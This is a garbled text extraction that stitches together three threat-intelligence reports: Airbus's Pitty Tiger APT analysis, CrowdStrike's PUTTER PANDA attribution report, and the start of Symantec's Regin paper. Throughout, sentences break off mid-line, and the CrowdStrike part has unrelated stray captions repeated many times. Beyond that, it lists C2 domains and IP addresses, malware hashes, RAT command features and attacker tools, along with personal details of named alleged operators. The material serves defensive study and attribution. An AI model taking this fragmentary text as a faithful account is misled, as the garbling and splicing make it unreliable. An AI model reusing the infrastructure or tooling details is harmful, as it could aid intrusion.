This tmp file is then copied to “ C:\Windows\system32\Nwsapagentex.dll ” and registered as a service
This malware is a variant of the infamous Gh0st RAT1 . Our specific sample uses “ ssss0 ” instead of
Command & Control
The commands ID used in the communication protocol have also changed , but the features are
The configuration is directly embedded in the binary , and deciphered at runtime . Up to 5 c&c servers
Tiger is no exception , as detailed later in this report .
We also found two c&c binaries , claiming to be versions 2.1 and 2.2 of the Paladin RAT controller .
Version 2.1 answers to the “ ssss0 ” header , while version 2.2 uses the classical “ Gh0st ” header .
Paladin controller used with one of our testing machines
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
Paladin has multiple features : file transfer , screenshot , command shell …
Additionally to the Paladin RAT , we found another variant of Gh0st RAT , named “ Leo ” . Although we
Moreover , the built malware we found in the same folder was configured to connect to a local IP
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
Leo malware controller screenshot – a variant of Gh0st RAT
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
Our investigation has focused on three particular c&c servers used by the group . These c&c servers ,
We found several domains used by the Pitty Tiger group , the most interesting ones being detailed in
Pitty Tiger , like other APT attackers , often use anti - virus “ familiar names ” when registering domains
The      registration    information    for     this    domain        has     been       the     same    since    2013 - 06 - 04 :
Domain Name : avstore.com.tw
Registrant :
This information has been used to register another domain , skypetm.com.tw , which has also been
Malware families
Our research also led us to the discovery of four different malware families connected to
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
Links between malware samples , malware families , and avstore.com.tw subdomains
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
C&C servers and IP addresses
Hosting company              Geolocation         IP Range             IP Address          Host                        Time space
Datacenter                   Kong                122.10.63.255
Hurricane Electric Inc       Fremont , USA        66.220.0.0 –         66.220.4.100        mac.avstore.com.tw          Actually in use
New World Telephone LTD      Hong Kong City ,     58.64.175.0 –        58.64.175.191       jackyandy.avstore.com.tw    Dec. 2013
Hong Kong           58.64.175.255
This domain has shown two different WHOIS entries through time :
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
Registrant : chenzhizhong
Email : hurricane_huang@163.com
Telephone : + 86.2426836910
Registrant : long sa
Email : longsa33@yahoo.com
Telephone : + 86.88885918
The most recent registration information is also used for avstore.com.tw .
Malware families
Six malware families have been identified as communicating with subdomains of skypetm.com.tw :
Unknown                                               Backdoor : Win32/Ptiger . A                  asdf.skypetm.com.tw
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
Hosting Company        Geolocalisation         IP Range             IP Address           C&C server                 Timeline
Take 2 Hosting Inc.    San Jose , USA           173.252.192.0 -      173.252.198.103      newb02.skypetm.com.tw      Actually in use
Hurricane Electric     Fremont USA             66.220.0.0 -         66.220.4.100         sophos.skypetm.com.tw      Actually in use
Inc.                                          66.220.31.255
Taiwan Academic        Taipei , Taiwan          210.60.0.0 -         210.60.141.45        botemail.skypetm.com.tw    2012 - 03 - 06
Network                                       210.60.255.255
Gorillaservers Inc.    Los Angeles , USA        198.100.96.0 -       198.100.121.15       sophos.skypetm.com.tw      ?
Gorillaservers Inc.    Los Angeles , USA        198.100.96.0 -       198.100.121.15       margo.skypetm.com.tw       2013 - 11 - 22
Webnx Inc.             Los Angeles , USA        216.18.192.0 -       216.18.208.4         botemail.skypetm.com.tw    2013 - 04 - 04/2013-
Webnx Inc.             Los Angeles , USA        216.18.192.0 -       216.18.208.4         qinoo.skypetm.com.tw       ?
Data                   Taipei , Taiwan          59.112.0.0 -         59.120.84.230        botemail.skypetm.com.tw    2012 - 03 - 12/2012-
Communication                                 59.123.255.255                                                     04 - 28
Business Group
Data                   Taipei , Taiwan          211.75.128.0 -       211.75.195.1         super.skypetm.com.tw       2011 - 08 - 30/2013-
Communication                                 211.75.255.255                                                     12 - 16
Business Group
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
Data               Taipei , Taiwan          61.220.0.0 -           61.220.44.244      aniu.skypetm.com.tw     2013 - 04 - 05/2013-
Communication                             61.227.255.255                                                  12 - 16
Business Group
Data               Taipei , Taiwan          61.220.0.0 -           61.220.44.244      zeng.skypetm.com.tw     ?
Communication                             61.227.255.255
Business Group
Data               Taipei , Taiwan          61.220.0.0 -           61.220.209.17      qinoo.skypetm.com.tw    ?
Communication                             61.227.255.255
Business Group
New World          Hong Kong City ,         113.10.169.0 -         113.10.169.162     margo.skypetm.com.tw    Actually in use
Telephone Ltd.     Hong Kong               113.10.169.255
New World          Hong Kong City ,         58.64.185.0 -          58.64.185.200      zeng.skypetm.com.tw     2013 - 12 - 16/2013-
Telephone Ltd.     Hong Kong               58.64.185.255                                                   12 - 16
New World          Hong Kong City ,         113.10.240.0 -         113.10.240.54      qinoo.skypetm.com.tw    ?
Telephone Ltd.     Hong Kong               113.10.240.255
New World          Hong Kong City ,         113.10.221.0 -         113.10.221.126     zeng.skypetm.com.tw     ?
Telephone Ltd.     Hong Kong               113.10.221.255
New World          Hong Kong City ,         113.10.240.0 -         113.10.240.50      link.skypetm.com.tw     2012 - 12 - 21/2013-
Telephone Ltd.     Hong Kong               113.10.240.255                                                  12 - 16
Asia Data ( hong    Hong Kong City ,         101.1.17.0 -           101.1.25.74        zeng.skypetm.com.tw     Actually in use
Kong ) Limited      Hong Kong               101.1.31.255
Isp Satellite      Hong Kong City ,         202.174.130.0 -        202.174.130.110    ms11.skypetm.com.tw     2011 - 02 - 27/2013-
Broadband          Hong Kong               202.174.130.255                                                 12 - 16
Provider
Jeongkyunghee      Anyang , South           221.144.0.0 -          221.150.164.114    link.skypetm.com.tw     2011 - 06 - 29/2012-
Korea                   221.168.255.255                                                 12 - 18
Malware families and samples
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
Links between malware samples , IP addresses and c&cs associated to avstore.com.tw and skypetm.com.tw
Domain                     Shares          with                              Comment
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
Links between domains used by Pitty Tiger
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
Timeline of Pitty Tiger domains registration information , based on e - mail address
Some domains registered by the group are very old . There is an increase in the registrations from
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
Mapping the victims of such a targeted campaign is not an easy task .
We have found the Pitty Tiger group to be very active against one particular private company from
We have also found some connections from other companies to the c&c servers , yet we did not find
These alleged victims do work in different sectors and are located mostly in European countries .
It might be surprising to see a company specialized in web development here , yet it has built
We have to mention that we only had access to three of the several attackers’ servers . Therefore ,
We also found a lot of vulnerability scanners launched by the attackers at different targets , yet there
During the course of our investigations , we discovered a RAR archive on the attacker ’s server
Interestingly enough , we saw a part of these documents appear on Virus - Total , with an additional
There are only two options we can think of here :
Since we were unable to determine the intended use of this specific document , we can only suppose
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
During our investigation , we found out interesting information about the Pitty Tiger group itself . After
We have been able to get all the RDP connections logs to one c&c server :
These connections are either VPS or dynamic IP addresses , mostly from China .
A computer named CHMXY - PC connected to the c&c via RDP with IP address 58.61.40.5 . The IP is
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
A few connections to the c&c were done by a computer named TIEWEISHIPC with IP address
Some connections to the c&c originated from a computer named FLY - THINK with several IP
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
Most of the connections to the c&c server were coming from a computer named 50PZ80C-
Nanchang ( Jiangxi ’s province capital ) . The last one came from a VPS instance located in Los
Angeles ( California , USA ) but purchased by a China based VPS provider XeVPS which belong to
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
The two computers FLY - THINK and 50PZ80C-1DFDCB8 have used distinct IP addresses to
We mapped these RDP connections to have a graphical view :
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
We found that a member of this group of attackers used some tools on his own system , for testing
He launched some tests with the CT RAT we exposed earlier :
User “ Toot ” logging on the CT RAT on machine “ toot-2a601225a8 ” , 2014/02/10
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
User “ Toot ” logging on the CT RAT on machine “ toot-2a601225a8 ” , 2014/04/09
User “ Toot ” logging on the CT RAT on machine “ toot-2a601225a8 ” , 2014/04/09
Here we can see a user “ Toot ” from a machine named “ toot-2a601225a8 ” logging in the CT RAT
We can also see the system : Microsoft Windows XP SP3 . The “ P ” field is the language ID .
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
The “ M ” field is probably used for versioning . It is a hardcoded string in the binary .
After these tests , we could see some real connections to a victim using this RAT . Here is a follow - up
Command                                        Effect
Dir                                            Lists the content of the folder . The
At this point , the output shows the
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
Public domain .
The attacker goes on like this , using his tools , and then ends the communication with this RAT on
Please note that at this point , the attacker has at least the privileges of a local administrator , since
In addition to all information already shown , we saw Toot connect to an account on a cloud service
We did not find more information about user “ Toot ” , yet we miss Chinese language capabilities .
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
The controller part of CT RAT / PittyTiger RAT revealed the following “ about ” information , once
We believe this translation of the author ’s name might not be accurate due to the use of automated
We identify the two nicknames on the current campaign as Automn Snow ( 秋雪 ) and Cold Air Kiss (
While we are confident that these people are indeed the developers of both PittyTiger and CT RAT
According to indicators we gathered and threat activities profiling we have some hypothesis on the
We have strong evidence of a bot operator position . We identify one nickname for this position , the
We also identified a malware development position . We identified two nicknames for this position on
We have a strong suspicion of a coordinator position , which coordinates the bot operator , provides
We named this position ‘ Chen’ , in relation with several references of this common Chinese name in
We have some suspicion of a customer relationship manager position that may act as an interface
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
Proposal for PittyTiger team structure
The c&c servers used by the attackers revealed a lot of interesting files stored in various folders :
Filename                     Description                                                    Public tool ?
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
Internet Explorer .
The file iepv-jiake.exe is the same , but crypted
Fluxay5Beta1                         Vulnerability scanner                                   Yes
Hscan1.2                             Vulnerability scanner                                   Yes
Openssl                              Heartbleed Exploit                                      Yes
X - Scan - v3.3                          X - Scan vulnerability scanner                            Yes
Symantec Endpoint Protection Manager ( CVE-
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
Shanian Port Scanner                     Port scanner                                                 Yes
This is quite the usual arsenal for a group of APT attackers :
What is rare to find is the controller part of those tools . We have been lucky enough to get the
The presence of a Chinese version of “ calc.exe ” , the official calculator provided in Microsoft
Windows , is interesting . Not only is it one more indicator of a probable Chinese origin , but also an
In addition to those tools , we found some interesting scripts . A script named ipc.bat uses a file
One script used to brute - force a network share inside a company ’s network
The user.txt file contains thousands of lines , each one being a couple of one particular username
Anonymized dictionary file used for brute - forcing a network share
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
This user.txt file has been anonymized , yet we wanted to give you the feel for it . This file is 67320
The passwords listed in this file are either build from several campaigns or from the current
We have also discovered a pack of files which can be used to trigger an Internet Explorer
We do not know if the Pitty Tiger group used this exploit or not , but found no trace indicating they
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
Determining who is exactly behind an APT campaign is difficult . We tried to extract different
Information relating to the tools used by the attackers has been leveraged for attribution :
The IP addresses used for the hosting of the c&c domains are mainly located in Taipei ( Taïwan ) and
Hong Kong City ( Hong Kong Special Administrative Region , PRC ) :
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
Hosting information links for the c&c servers used in this campaign
Most RDP connections to the c&c infrastructure come from Chinese IP ranges in Fuqing ( Fujian
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
All the items listed in this chapter are strong indicators that the attackers might be Chinese .
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
Pitty Tiger is a group of attackers that have been active since at least 2011 .
Pitty Tiger is effective and mature in the use of targeted malware , the use of known exploits to infect
They are quite unprofessional in their way of using their infrastructure : they do launch vulnerability
Pitty Tiger is probably not a state - sponsored group of attackers . The attackers lack the experience
One governmental network has been targeted by the group , yet we do not have any evidence of the
The campaign we studied has been largely focused on one particular target . We suspect the Pitty
Tiger group to work according to an opportunistic business model : this group might offer its services
This group seems to be very small compared to other APT groups . We have leveraged several
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
This list of indicators is provided in order to help people detect Pitty Tiger APT campaign .
Domains used by the Pitty Tiger group : ( please note several subdomains are used , as seen in the
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
Strings ( File / Network )                          Data type                          Malware Family
Mozilla/4.0 ( compatible ; )                                User - Agent                            Troj / ReRol . A
Public release
Threat Intelligence
Copyright © 2014 Airbus Defence & Space - All rights reserved
Intelligence
Report
Crowdstrike Global Intelligence Team
This report is part of the series of technical and strategic reporting available to CrowdStrike Intelligence subscribers . It is being released publicly
In May 2014 , the U.S. Department of Justice charged five Chinese nationals for economic espionage against U.S.
We believe that organizations , be they governments or corporations , global or domestic , must keep up the pressure and hold
China accountable until lasting change is achieved . Not only did the U.S. Government offer in its criminal indictment the
China ( PRC ) hacking campaign is limited to five soldiers in one military unit , or that they solely target the United States
Through widespread espionage campaigns , Chinese threat actors are targeting companies and governments in every
At CrowdStrike , we see evidence of this activity first - hand as our services team conducts Incident Response investigations
The campaign that is the subject of this report further points to espionage activity outside of Unit 61398 , and reveals
This particular unit is believed to hack into victim companies throughout the world in order to steal corporate trade
Parts of the PUTTER PANDA toolset and tradecraft have been previously documented , both by CrowdStrike , and in open
Targeted economic espionage campaigns compromise technological advantage , diminish global competition , and ultimately
George Kurtz
President / CEO & Co - Founder , CrowdStrike
Crowdstrike Global Intelligence Team
Table of     Executive summary ....................................................................................................................... 4
Contents :    Key Findings ........................................................................................................................................ 5
C2 Indicators ................................................................................................................................... 8
Targeting ....................................................................................................................................... 10
Connections to Other Adversary Groups .................................................................................. 11
Military Connections .................................................................................................................... 17
Unit 61486 .......................................................................................................................................... 20
Binary Indicators .......................................................................................................................... 24
Snort Rules .................................................................................................................................. 44
Conclusion ................................................................................................................................... 48
About CrowdStrike ...................................................................................................................... 60
Executive Summary
Crowdstrike Global Intelligence Team
China , with connections to the People ’s Liberation Army Third General Staff Department ( GSD ) 12th
Bureau Military Unit Cover Designator ( MUCD ) 61486 , since 2012 . The attribution provided in this report
Third Department is generally acknowledged to be China ’s premier Signals Intelligence ( SIGINT )
Domains registered by Chen Ping were used to control PUTTER PANDA malware . These domains were
This toolset provides a wide degree of control over a victim system and can provide the
This report contains additional details on the tactics , tools , and techniques used by PUTTER PANDA ,
Crowdstrike Global Intelligence Team
Shanghai , China , likely on behalf of       heavily targeting the US Defense and
Government , Defense , Research ,          ➔ There is infrastructure overlap with
United States , with specific               of interaction between actors tied
Attribution
Crowdstrike Global Intelligence Team
Attribution
There are several pieces of evidence
Chinese People ’s Liberation Army ( PLA ) .
Specifically , an actor known as cpyy ( Chen
Ping ) appears to have been involved
Unit 61398 of the PLA .
Crowdstrike Global Intelligence Team
C2 Indicators
Although some of the domains used
Table 1 .
C2 Domains and
Original Registrant
Email Addresses
Crowdstrike Global Intelligence Team
C2 Indicators ( cont’d )
The most significant finding is that an actor known as cpyy appears to have registered a significant number
Many of the domains have had their registrant information changed , likely in an attempt to obfuscate the
July 2009 and November 2009 , and for vssigma.com , the change occurred between August 2009 and
December 2009 . Historical registrant information for anfoundation.us , rwchateau.com , and succourtion.org
Similarly , several domains registered to
These registrant changes may indicate
Table 2 . New
Registrant Email                                                operators are preparing new campaigns
Addresses for                                                   that make use of this infrastructure , or they
Domains Original-
Crowdstrike Global Intelligence Team
C2 Indicators
Targeting
The subdomains associated with
It is likely that PUTTER PANDA will
Table 3 . Domains
Associated with
Registrant Emails
Found in PUTTER
Crowdstrike Global Intelligence Team
C2 Indicators ( cont’d )                                            The decipherment.net domains resolved to this IP
Connections to Other
October 2012 to 24 March 2013 .
Adversary Groups
During part of this timeframe ( 30 June 2012 - 30
October 2012 ) , a domain associated with COMMENT
Based on passive DNS records ,
The use of the same IP address during the same time
Additionally , several subdomains of
Although not as conclusive as the
Another subdomain of ujheadph.com has been
See http://webcache.googleusercontent.com/search?q=cache:ZZyfzC1Y0UoJ:www.urlquery.net/report .
Crowdstrike Global Intelligence Team
Several email addresses have been associated with cpyy , who also appears to use the alternate handles
The cpyy.net domain lists “ Chen Ping ” as the registrant name , which may be cpyy ’s real name , as this
The profile on this blog ( shown in Figure 2 below ) indicates that the user is male , was born on 25 May 1979 ,
Figure 2 . cpyy
Personal Blog on
Crowdstrike Global Intelligence Team
This blog contains two postings in the “ IT ” category that indicate at least a passing interest in the topics of
Another personal blog for cpyy ( http://www.tianya.cn/1569234/bbs ) appears to have last been updated in
Figure 3 . cpyy
Personal Blog on
See postings : http://bbs.csdn .
Crowdstrike Global Intelligence Team
On the XCar forum , cpyy.chen used a subforum
Linxder is the handle of an actor associated with
Network Security Team ( see below ) .
Figure 4 . cpyy.chen ,
An album in this site named “ me ” has several shots of
Crowdstrike Global Intelligence Team
An account on rootkit.com , a popular low - level software security site , existed for user cpyy and was accessed
Ltd. , an ISP located in Shanghai . Registration on this forum shows that cpyy had an interest in security - related
Figure 6 . Example
Photograph from
Figure 5 . Sample
Photograph from
Picasa Albums
Crowdstrike Global Intelligence Team
One of the sites registered to cpyy was used to host a web - based email service , along with a forum on www .
One of these articles , entitled “ IMD - based packet
This digest list / bulletin board was also frequented
Shanghai - based , PLA - sponsored adversary group
Engineering ( SISE ) as a source of research and
Figure 7 . httpchen
Posting on SJTU
An additional connection to SJTU comes from
The posting indicates that httpchen is located at the 闵行 ( Minhang ) campus of SJTU and was posting using
For example , hxxp://www.xfocus.net / articles/200307/568.html
This article also lists http://cpyy.vicp.net/ as the original source site , although no archived content could be recovered for this .
See http://bbs.sjtu.edu.cn/bbsanc,path,/groups/GROUP_3/Security/D44039356/D69C6D2AC/D4C11F438/D6DB67E4E/DA69FF663/
Crowdstrike Global Intelligence Team
Military Connections
Several pieces of evidence indicate that cpyy probably has connections to , or is part of , the Chinese military
First , a monochrome picture from
It is not clear whether this picture
A picture from the 中学时代
February 2007 shows a male –
Crowdstrike Global Intelligence Team
Although somewhat unclear , pictures from the album 2002年的生日 ( “ 2002 birthday ” ) , also posted in
February 2007 , show the celebrant ( likely cpyy ) in khaki clothes that are possibly military wear .
The most compelling pictures ,
Crowdstrike Global Intelligence Team
This album also contains a shot of the exterior of a building with several large satellite dishes outside :
This same building and the
Crowdstrike Global Intelligence Team
Above is an image from the same album of what appears to be a larger dish , in front of the Oriental Pearl
Tower , a significant landmark in Shanghai :
As mentioned above , checalla.com was used for command and control with the PUTTER PANDA 4H RAT in
Figure 9 shows an enlargement of satellite imagery from within this area , depicting a facility containing
Source : https://www.google.com/maps/place/31%C2%B017’18.0%22N+121%C2%B027’18.7%22E/@31.2882939,121.4554673,658m/
Crowdstrike Global Intelligence Team
Figure 8 . Map and
Satellite Views of
Area of Interest in
Shanghai
Figure 9 . Enlarged
Section within
Area of Interest
Crowdstrike Global Intelligence Team
Satellite imagery from 2009 showing another aspect of this office building , along with a likely vantage point
Figure 10 . Satellite
Imagery of Facility
Alongside Handheld
Image from cpyy
Based on the Shanghai location , and common features , it is highly likely that the location shown above
Alternately Romanized as Zhabei
Crowdstrike Global Intelligence Team
Figure 11 . Panoramio
Images Compared
According to a public report15 on the Chinese PLA ’s General Staff Department ( GSD ) , the 12th Bureau of
A webpage16 published on a Chinese government site detailing theatrical performances involving members
Forces General Staff ) . A search for this location shows an identical area to that shown in Figure 8 .
It can therefore be concluded with high confidence that the location shown in cpyy ’s imagery , along
Crowdstrike Global Intelligence Team
Binary indicators
Observed build times for the PUTTER PANDA tools described in this report range from 2007 to late 2013 ,
Figure 1 . Build
Time Analysis of
Malware , Relative
Although this shows that there is some bias in the build time distribution to daylight or working hours in China , which
Crowdstrike Global Intelligence Team
Conclusions
There is strong evidence to tie cpyy , an actor who
Shanghai that is operated by the 12th Bureau , 3rd GSD
This university has previously been posited as a recruiting
Given the evidence outlined above , CrowdStrike
Technical Analysis
Crowdstrike Global Intelligence Team
Technical Analysis
Several RATs are used by PUTTER PANDA . The most common of these , the 4H
This RAT was first analyzed by CrowdStrike in April 2012 , but a historical analysis shows that it has been in
Screenshot of Truecaller
Database Shared by
The operation of this RAT is described in detail in other CrowdStrike reporting , but isTwitter
Crowdstrike Global Intelligence Team
Figure 8 . 4H RAT
Example Beacon
Screenshot of Truecaller
Database Shared by
Figure 9 . Sample
Twitter Account ( names
Python Code to
Decode Hostname
The 3PARA RAT was described in some detail in other CrowdStrike reporting , which
On startup , the RAT attempts to create a file mapping named
Crowdstrike Global Intelligence Team
Figure 10 . Sample
Python Code Illus-
Decoding Routine
The RAT is programmed in C++ using Microsoft Visual Studio , and it makes use of the
Template Library ( STL ) objects are used to represent data structures such as strings and
C2 protocol , such as receiving data from the server , decrypting data , and processing
Once running , the RAT will load a binary representation of a date / time value13 from a
Screenshot of Truecaller
This      Shared by
Twitter Account ( names
Figure 11 . 3PARA
As with the 4H RAT , the C2 protocol used by the 3PARA RAT is HTTP based , using
Using the standard Windows SYSTEMTIME structure
Crowdstrike Global Intelligence Team
Screenshot of Truecaller
Database Shared by
Twitter Account ( names
Figure 12 . Sample
C2 Registration
See http://msdn.microsoft.com/en-us/library/windows/desktop/bb759853(v=vs.85).aspx for details of this API , which is rarely used .
Crowdstrike Global Intelligence Team
If this request is also successful , the RAT will attempt to retrieve tasking from the
Screenshot of Truecaller
Database Shared by
Twitter Account ( names
Figure 13 . 3PARA
Request
Crowdstrike Global Intelligence Team
Returned tasking is decrypted using the DES algorithm in CBC mode with a key derived from the MD5 hash
The set of commands supported by the RAT is somewhat limited , indicating that perhaps the RAT is intended
•C CommandAttribe – Retrieve metadata for files on disk , or set certain attributes such as creation/
•C CommandCMD – Execute a command , with standard input / output / error Screenshot of Truecaller
Twitter Account ( names
However , other commands are not implemented in this way . These other commands contain functionality to :
•P rovide a date and time before which beaconing will not resume , recorded in the file C:\RECYCLER\
The use of C++ classes that inherit from a base class to carry out some of the tasking commands , along
Crowdstrike Global Intelligence Team
The pngdowner malware is a simple tool constructed using Microsoft Visual Studio and implemented via single
C++ source code file . This sample contains a PDB path of Y:\Visual Studio 2005\Projects\branch - downer\
Initially , the malware will perform a connectivity check to a hard - coded URL ( http://www.microsoft.com ) ,
Database Shared by
Twitter Account ( names
Content returned from this request to the C2 server will be saved to a file named index.dat in the user ’s
The limited functionality , and lack of persistence of this tool , implies that it is used only as a simple download-
Template Library ( STL ) , older versions of the RAT ( such as MD5 hash b54e91c234ec0e739ce429f47a317313 ) , built
Crowdstrike Global Intelligence Team
Like pngdowner , the httpclient malware is a simple tool that provides a limited range of functionality and uses
The malware will then connect to its configured C2 infrastructure ( file.anyoffice.info ) and perform a HTTP
Screenshot of Truecaller
Figure 14 . HttpClient
Database Shared by
Sample Beacon
Twitter Account ( names
Content returned from the C2 server is deobfuscated by XOR’ing the content with a single byte , 0x12 . The
Slight variations on the C2 URLs are used for different phases of the C2 interaction :
Both methods are detailed here : http://securityxploded.com/iepasswordsecrets.php
Crowdstrike Global Intelligence Team
Given the lack of a persistence mechanism and low level of sophistication , it is likely that httpclient – like
Other CrowdStrike reporting describes a dropper used by PUTTER PANDA ( abc.scr ) to install the 4H RAT . This
Another dropper has been observed , exclusively installing the pngdowner malware ( example MD5 hash
Database Shared by
Both the document and executable are written to disk and the executed via the ShellExecute              API ( using the
Twitter Account ( names
The dropped executable ( MD5 hash 38a2a6782e1af29ca8cb691cf0d29a0d ) primarily aims to inject
Firefox ( firefox.exe ) are used . If Internet Explorer is used , then the malware will attempt to terminate processes
Four examples of these droppers were located , using a mixture of decoy PDF and Microsoft Word documents
Toulouse Space Centre , the “ largest space centre in Europe ” ) , indicating that the attackers have a keen
Attribution section above ) .
The API used expects a parameter of the form char * * , and is given a char * pointer to the “ * / * ” string , but the stack data following this
Crowdstrike Global Intelligence Team
Figure 15 . “ In-
Dropped by a4e4b-
Screenshot of Truecaller
Database Shared by
Twitter Account ( names
Figure 16 . “ Bien-
Dropped by
Crowdstrike Global Intelligence Team
Figure 17 . “ 50th AIAA
Satellite Sciences
Screenshot of Truecaller
Database Shared by
Twitter Account ( names
Figure 18 : “ Proj-
Description - Sur-
Mitigation & Remediation
Crowdstrike Global Intelligence Team
A number of specific and generic
Database Shared by
The following Windows registry artifacts are indicative of a compromised host : redacted )
The presence of the following file system artifacts is indicative of a compromised host :
A file mapping named & * SDKJfhksdf89*DIUKJDSF&*sdfsdf78sdfsdf also indicates the victim machine is
Crowdstrike Global Intelligence Team
Yara Rules
Crowdstrike Global Intelligence Team
Crowdstrike Global Intelligence Team
Crowdstrike Global Intelligence Team
Crowdstrike Global Intelligence Team
In addition the domains listed in the Appendices and in the Attribution section , the generic signatures below
Snort Rules
Screenshot of Truecaller
Database Shared by
Twitter Account ( names
Crowdstrike Global Intelligence Team
Screenshot of Truecaller
Database Shared by
Twitter Account ( names
Crowdstrike Global Intelligence Team
In addition to the indicators described above , PUTTER PANDA have some distinct generic TTPs :
Screenshot of Truecaller
Database Shared by
Twitter Account ( names
Conclusion
Crowdstrike Global Intelligence Team
Conclusion
Research presented in this report shows that the PUTTER PANDA operators are
Database Shared by
Twitter Account ( names
The detection and mitigation guidance given in this report will help to
Appendices
Crowdstrike Global Intelligence Team
Screenshot of Truecaller
Database Shared by
Twitter Account ( names
Crowdstrike Global Intelligence Team
Crowdstrike Global Intelligence Team
Crowdstrike Global Intelligence Team
Screenshot of Truecaller
Database Shared by
Twitter Account ( names
Crowdstrike Global Intelligence Team
Screenshot of Truecaller
Database Shared by
Twitter Account ( names
Crowdstrike Global Intelligence Team
Screenshot of Truecaller
Database Shared by
Twitter Account ( names
Crowdstrike Global Intelligence Team
Crowdstrike Global Intelligence Team
Screenshot of Truecaller
Database Shared by
Twitter Account ( names
Crowdstrike Global Intelligence Team
Falcon                                                       Falcon
Intelligence                                                 Intelligence
Quickly understand the capabilities
Access to CrowdStrike Falcon Intelligence is geared
Gain visibility into breaking events
Crowdstrike Global Intelligence Team
Mac & Windows
Falcon Host is comprised of two core components ,
Technology Drivers :
Stateful Execution inspection
Falcon Host leverages a lightweight kernel - mode
Stateful Execution Inspection ( SEI ) tracks execution state and
Stateful Execution Inspection ( SEI ) at the endpoint
Without performing intrusive and performance-
Benefits
Adversary - in - Motion : reconnaissance , exploitation ,
Falcon Host delivers insight into past and current
Crowdstrike Global Intelligence Team
About CrowdStrike
Stateful Execution Inspection ( SEI ) at the endpoint and Machine Learning
About CrowdStrike Services
Intelligence professionals , Incident Responders , and Malware Researchers
Security Operations Center to monitor the full CrowdStrike Falcon Platform and
For more information on the intelligence provided in this report or on
To learn more about the CrowdStrike Falcon Platform or
Regin : Top - tier espionage tool
Symantec Security Response
Version 1.0 – November 24 , 2014
Regin is an extremely complex piece of software that can be
Introduction ................................................................... 5
Timeline .......................................................................... 5
Target profile .................................................................. 6
Infection vector ........................................................ 6
Architecture ................................................................... 8
Stage 0 ( dropper ) ..................................................... 9
Stage 1 ...................................................................... 9
Stage 2 ...................................................................... 9
Stage 3 ...................................................................... 9
Stage 4 ............................................................ 	 11
Stage 5 .................................................................... 11
Encrypted virtual file system containers 	 �������������� 11
Command - and - control operations ......................... 12
Logging ................................................................... 12
Payloads ....................................................................... 14
File names .............................................................. 15
Stage differences ................................................... 15
Conclusion .................................................................... 16
Protection ..................................................................... 16
Appendix ...................................................................... 18
Data files ................................................................ 18
Indicators of compromise ............................................ 20
File MD5s ................................................................ 20
File names / paths .................................................... 20
Extended attributes ............................................... 21
Registry .................................................................. 21
In the world of malware threats , only a few rare examples can truly be considered
Regin is an extremely complex piece of software that can be customized with a wide
The main purpose of Regin is intelligence gathering and it has been implicated in data
